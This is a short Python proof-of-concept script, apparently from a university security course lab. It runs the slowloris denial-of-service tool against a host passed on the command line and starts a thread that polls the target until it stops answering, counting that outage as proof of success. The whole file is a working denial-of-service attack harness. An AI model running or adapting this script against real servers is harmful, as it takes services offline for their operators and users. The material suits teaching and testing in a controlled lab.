import os, sys, time, threading, requests

def assertDoS(threadName, delay):
    time.sleep(delay)
    condition = True
    while condition:
        print('Trying to request...')
        try:
            time2 = requests.get('http://'+sys.argv[1]).elapsed.total_seconds()
            # In some cases this new socket is able to connect (some of the slowloris's disconnects)
            print('Did manage to connect in', time2, 'seconds')
            print('Probabilly managed to connect a socket. Will try PoC again...')
        except:
            print('Host unreachable')
            condition = False
            assert True
            # proved the concept

if __name__ == "__main__":
    
    if(len(sys.argv) < 2):
        print('python3 vuln10 <groupImage>')
        quit()

    time1 = requests.get('http://'+sys.argv[1]).elapsed.total_seconds()
    print('Normal request time: ', time1, ' seconds')

    # https://github.com/gkbrk/slowloris
    # Example: 'slowloris 1e20646419f415513131d83be200e0326560be38193c43242109fc7f9223.project.ssof.rnl.tecnico.ulisboa.pt'
    print('Ctrl+C to stop')
    command = 'slowloris ' + sys.argv[1]

    threading._start_new_thread(assertDoS, ("thread",10,))

    os.system(command)